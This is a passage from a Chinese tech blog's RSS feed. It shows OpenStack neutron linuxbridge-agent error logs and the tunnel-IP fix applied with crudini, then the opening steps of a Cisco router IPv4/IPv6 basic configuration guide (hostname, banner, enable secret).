<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">tries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exhausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3c141ca8-0545-4627-af9b-30c84ec3454b.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:33.049</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22878</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nova.scheduler.utils</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-47aa5b56-67c2-4dd3-9491-077d0bc12a11 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">533bc002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [instance: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">3c141ca8-0545-4627-af9b-30c84ec3454b]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Setting</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sta</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">te.:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MaxRetriesExceeded:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exceeded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> maximum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> number</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> of</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retries.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Exhausted</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> all</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> hosts</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> available</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> retrying</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> failures</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instance</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 3c141ca8-0545-4627-af9b-3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">0c84ec3454b.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:17:33.151</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22878</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> WARNING</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> oslo_config.cfg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [req-47aa5b56-67c2-4dd3-9491-077d0bc12a11 </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">83b70ce8339e4673ae33edf613291108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> b91453e898d2402495f54b8533bc</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">002b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> -</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 9a37718adbcf441aa294c93d40bb91bc]</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "url"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> group</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "neutron"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> is</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> deprecated</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> removal</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (Endpoint </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">lookup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uses</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> t</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">he</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> catalog</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> via</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> common</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> keystoneauth1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Adapter</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configuration</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> options.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> In</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> current</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> release,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "url"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> override</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> this</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> behavior,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> but</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> will</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ignored</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">/or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> removed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> future</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> release.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> To</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> achieve</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> same</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> result,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> use</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> endpoint_override</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> instead.</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">).  Its value may be silently ignored in the future.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>均无法看出错误</p>
<h3>计算节点 compute</h3>
<h4>tail -f linuxbridge-agent.log</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">_ip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bound</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> an</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host.</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Please</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local_ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.17.1.10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> on</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> interface</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> be</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> tunneling</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> and</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> the</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:37.411</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 12909</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:40.376</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 12933</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:43.384</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 12957</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:46.179</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 12981</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:49.139</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13005</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:52.156</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13029</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:54.938</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13056</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:18:57.886</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13086</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:19:00.898</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13114</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:19:03.881</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13146</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:19:06.870</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13171</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:19:09.873</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13195</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">2020-11-22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 18:19:12.878</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 13219</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ERROR</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> neutron.plugins.ml2.drivers.linuxbridge.agent.linuxbridge_neutron_agent</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [-] Tunneling cannot be enabled without the local_ip bound to an interface on the host. Please configure local_ip 172.17.1.10 on the host interface to be used </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> tunneling and restart the agent.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>问题找到了 ，compute找不到Tunnel Network Interface. example:x.x.x.x</h3>
<p>INTERFACE_IP=172.17.1.20</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">手误，更改</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> TUNNELIP后创建云主机正常</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">对于Q版快速更改方法</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">crudini</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> linux_bridge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> physical_interface_mappings</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  provider:172.17.1.20</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">crudini</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/neutron/plugins/ml2/linuxbridge_agent.ini</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vxlan</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local_ip</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 172.17.1.20</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Cisco路由器配置ipv4和ipv6的VTY账户密码</title>
      <link>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AEipv4%E5%92%8Cipv6%E7%9A%84VTY%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81.html</link>
      <guid>https://www.geekery.cn/note-book/%E4%BA%A4%E6%8D%A2%E6%9C%BA/Cisco%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AEipv4%E5%92%8Cipv6%E7%9A%84VTY%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cisco路由器配置ipv4和ipv6的VTY账户密码</source>
      <description>Cisco路由器配置ipv4和ipv6的VTY账户密码 本指南旨在详细描述如何配置两个分支机构的网络设备。分支机构 A 和 B 分别采用 IPv4 和 IPv6 地址方案。学习本文档，帮助网络管理员可以了解如何设置主机名、密码、接口 IP 地址以及其他基本的网络配置，以确保网络的安全性和稳定性。 Branch-A IPv4 配置 进入特权模式 在开始配...</description>
      <pubDate>Thu, 01 Aug 2024 06:53:44 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>本指南旨在详细描述如何配置两个分支机构的网络设备。分支机构 A 和 B 分别采用 IPv4 和 IPv6 地址方案。学习本文档，帮助网络管理员可以了解如何设置主机名、密码、接口 IP 地址以及其他基本的网络配置，以确保网络的安全性和稳定性。</p>
</blockquote>
<h2>Branch-A IPv4 配置</h2>
<h3>进入特权模式</h3>
<p>在开始配置之前，需要进入设备的特权模式。可以使用以下命令：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>进入全局配置模式</h3>
<p>进入全局配置模式后，可以进行设备的全局设置：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">configure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> terminal</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>设置主机名</h3>
<p>设置主机名有助于网络管理和识别：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">hostname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Branch-A</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>设置公告标语</h3>
<p>公告标语用于在用户连接到设备时显示重要信息：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">banner</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> motd</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #Branch-A#</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>配置特权 EXEC 密码</h3>
<p>为确保安全，设置特权 EXEC 密码：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">enable</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> secret</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> class</span></span></code></pre>
